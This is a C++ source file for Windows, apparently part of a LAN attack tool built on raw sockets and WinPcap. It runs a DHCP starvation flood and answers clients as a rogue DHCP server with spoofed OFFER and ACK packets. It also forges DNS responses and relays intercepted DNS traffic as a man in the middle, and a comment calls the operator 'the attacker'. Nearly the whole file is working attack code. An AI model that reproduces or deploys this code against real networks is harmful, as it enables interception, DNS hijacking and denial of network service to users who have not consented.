#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define HAVE_REMOTE
#define WPCAP

#include "Headers.h"
#include "Packets.h"
#include "Utils.h"
#include "Spoofing.h"

#include <pcap.h>
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "packet.lib")

#include <time.h>
#include <iostream>
#include <Mstcpip.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#pragma pack(1)
#pragma comment(lib, "Ws2_32.lib")

#include <map>

void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);

int sendDiscoverPacket(AddressInfo& info)
{
	SOCKET s;
	sockaddr_in dst;
	int optval = 1;

	dst.sin_family = AF_INET;
	dst.sin_port = htons(67);								/* difine the destination */
	inet_pton(AF_INET, (char*)info.broadcast, &dst.sin_addr.s_addr);

	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); //Create a RAW socket

	if (s == SOCKET_ERROR)
	{
		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
		WSACleanup();
		return 1;
	}

	setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval); //Set the socket as a RAW socket


	char* raw_packet = new char[65536];
	createDHCPDiscoverPacket(raw_packet, info);

	sendto(
		s,
		raw_packet,
		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header),
		0, (sockaddr*)&dst,
		sizeof(dst)
	);
	delete[] raw_packet;
	closesocket(s);
	return 0;
}

int sendOfferPacket(DHCP_header& rDHCP, IP_header& rIP, AddressInfo& info)
{
	pcap_t* sock = pcap_open(getDeviceName(info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);
	
	char* raw_packet = new char[65536];
	if (!sock)
	{
		std::cout << "error in pcap socket" << std::endl;
		return 1;
	}
		
	
	createDHCPOfferPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info);

	printIP(((IP_header*)&raw_packet[sizeof(Ethernet_header)])->ip_destaddr);

	if (pcap_sendpacket(
		sock,
		(u_char*)raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
	) != 0)
	{
		std::cout << "error " << pcap_geterr(sock) << std::endl;
		return 1;
	}
		
	
#if _DEBUG
	std::cout << "sent" << std::endl;
#endif

	delete[] raw_packet;
	pcap_close(sock);
	return 0;
}

int sendACKPacket(char* raw_packet, DHCP_header& rDHCP, IP_header& rIP, pcap_t* sock, AddressInfo& info)
{
	createDHCPackPacket(raw_packet, (void*)&rDHCP, (void*)&rIP, info); //Creating an acknowladge packet

	if (pcap_sendpacket(
		sock,
		(u_char*)raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DHCP_header)
	) != 0)
	{
		std::cout << "error " << pcap_geterr(sock) << std::endl;
		return 1;
	}
	return 0;
}

int sendDNSResponse(char* raw_packet, char* qDNS, pcap_t* sock, AddressInfo& info)
{
	bool mitm = false;
	size_t  tSize = createDNSResponsePacket(raw_packet, qDNS, info); // Creating the DNS response packet and 
																	// returning the size of the packet
	if (tSize == -1) /* Chcking for an impossible size, that means the packet has to be sent to a real DNS server*/
	{
		tSize = dnsMITM(qDNS, (uint8_t*)raw_packet, info);
		mitm = true; // declering mitm happened
	}
	if(pcap_sendpacket(
		sock,
		(u_char*)raw_packet,
		tSize
	) != 0 )
	{
		std::cout << "error " << pcap_geterr(sock) << std::endl;
		return 1;
	}
	if (mitm)
		return 2;
	return 0;
}

int dnsMITM(char* qDNS, uint8_t* raw_packet, AddressInfo& info)
{ 
	uint8_t* dstmac = getARPinformation(inet_addr((char*)info.gateWay));
	return manInTheMiddle(
		qDNS,
		raw_packet,
		dstmac,
		53,
		inet_addr((char*)info.DNS_IP),
		info
	);
}

DWORD WINAPI startDHCPStarvation(LPVOID info)
{
	
	for (int i = 0; i < 1000; i++)
	{
		sendDiscoverPacket(*(AddressInfo*)info);
		Sleep(20);
	}
	return 1;
}

DWORD WINAPI startSpoofing(LPVOID info)
{
	/*Creating the socket that listens to the traffic going through the adapter*/
	SOCKET s;
	pcap_t* sock;

	sockaddr_in sockinfo;
	sockaddr_in dst;
	int size = sizeof(dst);

	int optval = 1;
	int in;
	int error;
	bool responseError = false;
	int mitm;
	uint8_t destMac[6];

	DHCP_header pDHCP{};
	UDP_header pUDP{};
	IP_header pIP{};
	
	sockinfo.sin_addr.s_addr = inet_addr((const char*)(*(AddressInfo*)(info)).ipv4);
	sockinfo.sin_family = AF_INET;
	sockinfo.sin_port = htons(0);

	s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); //Create a RAW socket
	
	/*The socket for responding, can control the Dlink layer*/
	sock = pcap_open(getDeviceName(*(AddressInfo*)info), 0, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, NULL);

	/*End of inting the socket*/

	/*The receiving and responding packets, built only once to be more efficient*/
	char* raw_packet = new char[65536];
	char* response_packet = new char[65536];

	/*Creating a map for port forwarding*/
	std::map<uint16_t, uint32_t> portTable{};

	if (s == SOCKET_ERROR) /*Checking for an error in the creation of the socket*/
	{
		std::cout << "Socket error <" << WSAGetLastError() << ">" << std::endl;
		goto creationError;
	}

	bind(s, (sockaddr*)&sockinfo, sizeof(sockinfo));

	/*Setting the socket to raw mode and checking for erroes*/
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof optval) == -1)
	{
		std::cout << "setsockopt error <" << WSAGetLastError() << ">" << std::endl;
		goto creationError;
	}
	WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), 0, 0, (LPDWORD)&in, 0, 0);


	if (!sock) /*Checking for an error in the creation of the socket*/
	{
		std::cout << "error in pcap socket <" << pcap_geterr(sock) << ">" << std::endl;
		goto creationError;
	}


	/*Listens while no error occured*/
	while (!responseError)
	{
		/*Clearing the data of prior packets*/
		//memset(response_packet, 0, 65536);
		//memset(raw_packet, 0, 65536);

		/*Recieve packets*/
		error = recvfrom(s, raw_packet, 65536, 0, (sockaddr*)&dst, &size); 

		if (error == SOCKET_ERROR) /*Check for an error*/
		{
			std::cout << " recv error: " << WSAGetLastError() << std::endl;
			goto creationError;
		}

		getDHCPPacketInfo(raw_packet, pDHCP, pUDP, pIP); //Puts the data of the packet in the assosiated structs

		
		if (pUDP.dst_port == htons(67)) // Checks if the port is the port of DHCP
			if (getDHCPtype(pDHCP) == 3) // Checks for a request packet
				responseError = sendACKPacket(response_packet, pDHCP, pIP, sock,(*(AddressInfo*)(info)));
		
		if (pUDP.dst_port == htons(53)) // Checks if the port is the port of DNS
			if (pIP.ip_srcaddr != inet_addr((char*)((AddressInfo*)info)->ipv4)) // Checks the packet wasnt sent by the attacker
			{
				mitm = sendDNSResponse(response_packet, raw_packet, sock, (*(AddressInfo*)(info)));
				if (mitm == 2)
				{
					portTable.insert(std::pair<uint16_t, uint32_t>(pUDP.src_port, pIP.ip_srcaddr));
					responseError = 0;
				}
				else if (mitm == 1)
					responseError = 1;
			}
		if (portTable.find(pUDP.dst_port) != portTable.end())
		{
			memcpy(destMac, getARPinformation(portTable.find(pUDP.dst_port)->second), 6);
			int size = manInTheMiddle(
					raw_packet,
					(uint8_t*)response_packet,
					destMac,
					htons(pUDP.dst_port),
					portTable.find(pUDP.dst_port)->second,
					(*(AddressInfo*)info)
				);

			if (pcap_sendpacket(
				sock,
				(u_char*)response_packet,
				size
			) != 0)
			{
				std::cout << "error " << pcap_geterr(sock) << std::endl;
				responseError = 1;
			}
			portTable.erase(pUDP.dst_port);

		}
	}
//When an error occures the code jumps here
creationError: 
	delete[] response_packet;
	delete[] raw_packet;
	closesocket(s);
	pcap_close(sock);
	WSACleanup();
	return -1;
}
